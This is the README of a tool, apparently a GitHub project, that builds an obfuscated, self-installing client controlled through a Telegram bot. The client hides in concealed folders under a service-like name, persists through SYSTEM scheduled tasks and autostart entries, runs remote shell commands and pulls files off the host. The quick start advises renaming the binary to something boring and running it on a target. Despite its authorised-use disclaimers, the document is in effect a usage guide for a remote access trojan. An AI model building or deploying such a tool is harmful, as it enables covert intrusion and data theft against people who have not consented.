# MusashiShell

Telegram-controlled remote administration client + binary builder. Configure once, get a self-installing `.exe` that reports back to your Telegram and accepts shell commands.

> ⚠️ **Authorized use only.** For systems you own or have written permission to administer. Unauthorized access is illegal.

---

## What it is

- **Builder** (`builder.py`) — interactive CLI. Takes a bot token, admin ID, and client name; generates and compiles a single-file binary.
- **Template** (`resources/template.py`) — the client itself. Self-installs into a hidden folder, registers in OS autostart (elevated if possible), connects to Telegram, runs shell commands from a single admin.

**Target OS support:** Windows, Linux, macOS.

---

## Requirements

**Build machine:**
```bash
pip install rich pyinstaller aiogram
```

**Target machine:** nothing. The binary is self-contained.

**Python:** 3.10+.

> PyInstaller cannot cross-compile. Build on Windows for a `.exe`, on Linux for ELF, on macOS for Mach-O.

---

## Quick start

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Run builder
python builder.py

# 3. Choose [1], enter:
#    - Bot token  (from @BotFather)
#    - Admin ID   (your numeric ID from @userinfobot)
#    - Client name (e.g. "BOT Charlie")

# 4. Wait ~2-3 min. Binary appears at:
#    build/<slug>/dist/<slug>_obf.exe

# 5. Rename it to something boring, copy to target, run.
#    Telegram will receive "🟢 [NAME] ONLINE!"

# NOTE!!! After creating the bot token, send the bot a `/start` message to allow it to message you.
```

---

## Builder menu

| # | Action |
|---|---|
| 1 | Set config and build everything automatically |
| 2 | Rebuild `.exe` only (skips if nothing changed) |
| 3 | Regenerate `client.py` + `client_obf.py` |
| 4 | Show current settings |
| 5 | List built clients |
| 6 | Clean `build/` |
| 7 | Open log file |
| 0 | Exit |

Config is saved in `cfg/builder.conf`. Logs rotate in `logs/builder.log`.

---

## Bot commands

| Command | Action |
|---|---|
| `/start` | Host info: OS, user, IPs, MAC, admin status |
| `/help` | Command list |
| `/heartbeat` | Liveness: uptime, PID, offline flag |
| `/getfile <path>` | Download a file from target (≤ 50 MB) |
| `/putfile <dir>` | Upload a file from Telegram into `<dir>` |
| *any text* | Shell command (60 s timeout, output chunked at 4000 chars) |

Examples:
```
dir
ps aux | head -20
netstat -an | findstr LISTEN
```

---

## Where the client installs itself

| OS | Elevated | Regular user |
|---|---|---|
| Windows | `C:\ProgramData\.<rand>\` + schtasks as SYSTEM | `%LOCALAPPDATA%\.<rand>\` + `HKCU\...\Run` |
| Linux | `/opt/.<rand>/` + systemd unit | `~/.local/share/.<rand>/` + XDG autostart |
| macOS | `/Library/Application Support/.<rand>/` + LaunchDaemon | `~/Library/Application Support/.<rand>/` + LaunchAgent |

On Windows, folder and file get `HIDDEN + SYSTEM` attributes.

**Install marker** (prevents duplicate copies):
- Windows: `HKCU\Software\WinSvcIMTx32\LaunchPath`
- Unix: `~/.config/WinSvcIMTx32/install_path`

---

## Elevated install (Windows)

1. Right-click the renamed `.exe` → **Run as administrator**.
2. Accept the UAC prompt once.
3. Client re-installs to `ProgramData` and creates a `SYSTEM` scheduled task.
4. Every reboot from now on: silent start, highest privileges, no UAC.

---

## Uninstall

Kill the process first:
```
taskkill /F /IM WinSvcIMTx32.exe /T
```

**Windows (elevated):**
```
schtasks /Delete /TN WinSvcIMTx32 /F
reg delete "HKCU\Software\WinSvcIMTx32" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSvcIMTx32 /f
```

**Linux (root):**
```bash
systemctl disable --now WinSvcIMTx32.service
rm -f /etc/systemd/system/WinSvcIMTx32.service
rm -rf /opt/.<rand>
rm -f ~/.config/WinSvcIMTx32/install_path
```

**macOS (root):**
```bash
launchctl unload -w /Library/LaunchDaemons/com.WinSvcIMTx32.plist
rm -f /Library/LaunchDaemons/com.WinSvcIMTx32.plist
rm -rf "/Library/Application Support/.<rand>"
```

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| No "ONLINE" in Telegram | Check token/admin ID; check internet; check AV quarantine |
| `Token already in use` | Another instance is running — kill it |
| Build fails on `*.pyd` `WinError 5` | Running client holds the DLL — `taskkill`, then rebuild |
| `dir` output is `����` | Old build — current one decodes OEM codepage correctly |
| Terminal broken after resize | Use Windows Terminal, not old cmd/conhost |
| Duplicate copies in new folders | Install marker broken — check registry / marker file |

---

## Security notes

- **Bot token is a single point of failure.** Anyone with it controls every client. Rotate via @BotFather if leaked.
- **Token is recoverable** from the binary (obfuscated, not encrypted). Don't share binaries with untrusted parties.
- **AV may flag it** — self-copy + autostart + obfuscated payload = textbook malware signature. Add exclusions on your own machines.
- **Never install on machines you don't own.**

---

## License

GPL-3.0-or-later. See `LICENSE`.

---

## Legal

Provided for authorized security testing, red team engagements, and administration of systems you own. No liability for misuse. If you don't have **written permission**, don't install it.